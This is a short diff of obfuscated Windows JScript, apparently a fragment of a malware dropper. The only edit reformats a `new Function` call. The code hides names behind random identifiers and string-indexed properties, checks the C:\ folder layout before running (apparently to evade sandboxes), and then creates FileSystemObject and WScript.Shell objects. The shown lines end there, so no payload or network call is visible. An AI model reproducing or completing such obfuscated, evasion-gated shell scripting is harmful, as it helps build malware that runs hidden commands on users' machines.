@@ -1,5 +1,5 @@
 var ybdetof5 = new ActiveXObject("Scripting.FileSystemObject");
-if (new Function( "var inkezs3 = new Enumerator(ybdetof5.GetFolder('C:\\').SubFolders);  if(inkezs3.item(0).name.length > 1) return true; else return false;")()) {
+if (new Function("var inkezs3 = new Enumerator(ybdetof5.GetFolder('C:\\').SubFolders);  if(inkezs3.item(0).name.length > 1) return true; else return false;")()) {
 	hneneqil0 = this["WScript"];
 	istudyd7 = hneneqil0["CreateObject"]("Scripting.FileSystemObject");
 	lysfopdep3 = hneneqil0["CreateObject"]("WScript.Shell");
